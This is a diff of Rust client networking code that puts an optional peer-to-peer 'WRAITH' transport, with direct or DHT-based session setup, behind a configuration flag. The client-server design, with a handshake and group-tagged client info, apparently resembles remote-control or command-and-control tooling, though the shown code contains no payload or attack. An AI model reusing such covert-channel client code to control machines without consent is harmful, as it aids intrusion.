@@ -57,34 +57,39 @@ pub async fn reading_loop(
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::WraithServerInfo { node_id, ip, port })) => {
-                let mut server_id = WRAITH_SERVER_ID.lock().unwrap();
-                *server_id = Some(node_id);
-                println!("Received WRAITH server info: {}:{} id: {:?}", ip, port, node_id);
+                let config = get_config();
+                if config.use_wraith {
+                    let mut server_id = WRAITH_SERVER_ID.lock().unwrap();
+                    *server_id = Some(node_id);
+                    println!("Received WRAITH server info: {}:{} id: {:?}", ip, port, node_id);
 
-                let node_opt = WRAITH_NODE.lock().unwrap().clone();
-                if let Some(node) = node_opt {
-                    let addr_str = format!("{}:{}", ip, port);
-                    if let Ok(addr) = addr_str.parse() {
-                        tokio::spawn(async move {
-                            if let Err(e) = node.establish_session_with_addr(&node_id, addr).await {
-                                println!("Failed to establish WRAITH session with direct addr: {}. Trying DHT discovery...", e);
-                                if let Err(e) = node.establish_session(&node_id).await {
-                                    println!("Failed WRAITH session via DHT: {}", e);
+                    let node_opt = WRAITH_NODE.lock().unwrap().clone();
+                    if let Some(node) = node_opt {
+                        let addr_str = format!("{}:{}", ip, port);
+                        if let Ok(addr) = addr_str.parse() {
+                            tokio::spawn(async move {
+                                if let Err(e) = node.establish_session_with_addr(&node_id, addr).await {
+                                    println!("Failed to establish WRAITH session with direct addr: {}. Trying DHT discovery...", e);
+                                    if let Err(e) = node.establish_session(&node_id).await {
+                                        println!("Failed WRAITH session via DHT: {}", e);
+                                    } else {
+                                        println!("Established WRAITH session via DHT");
+                                    }
                                 } else {
-                                    println!("Established WRAITH session via DHT");
+                                    println!("Established WRAITH session with server directly");
                                 }
-                            } else {
-                                println!("Established WRAITH session with server directly");
-                            }
-                        });
+                            });
+                        }
                     }
                 }
             }
 
             Ok(Some(ClientboundPacket::InitClient)) => {
                 let mut client_info = client_info(config.group.clone()).await;
-                if let Some(node) = WRAITH_NODE.lock().unwrap().as_ref() {
-                    client_info.data.wraith_id = Some(*node.node_id());
+                if config.use_wraith {
+                    if let Some(node) = WRAITH_NODE.lock().unwrap().as_ref() {
+                        client_info.data.wraith_id = Some(*node.node_id());
+                    }
                 }
                 
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
@@ -386,15 +391,17 @@ pub async fn send_packet(packet: ServerboundPacket) -> Result<(), String> {
         };
         
         if let Some(sender) = sender_opt {
-            let wraith_node = WRAITH_NODE.lock().unwrap().clone();
-            let server_id = WRAITH_SERVER_ID.lock().unwrap().clone();
+            let config = get_config();
+            if config.use_wraith {
+                let wraith_node = WRAITH_NODE.lock().unwrap().clone();
+                let server_id = WRAITH_SERVER_ID.lock().unwrap().clone();
 
-            if let (Some(node), Some(sid)) = (wraith_node, server_id) {
-                // If it is not the very first packets, try WRAITH
-                let is_critical = matches!(packet, ServerboundPacket::EncryptionRequest | ServerboundPacket::EncryptionConfirm(_, _) | ServerboundPacket::ClientInfo(_));
-                if !is_critical {
-                    if let Ok(()) = node.send_data(&sid, &packet.serialized()).await {
-                        return Ok(());
+                if let (Some(node), Some(sid)) = (wraith_node, server_id) {
+                    let is_critical = matches!(packet, ServerboundPacket::EncryptionRequest | ServerboundPacket::EncryptionConfirm(_, _) | ServerboundPacket::ClientInfo(_));
+                    if !is_critical {
+                        if let Ok(()) = node.send_data(&sid, &packet.serialized()).await {
+                            return Ok(());
+                        }
                     }
                 }
             }
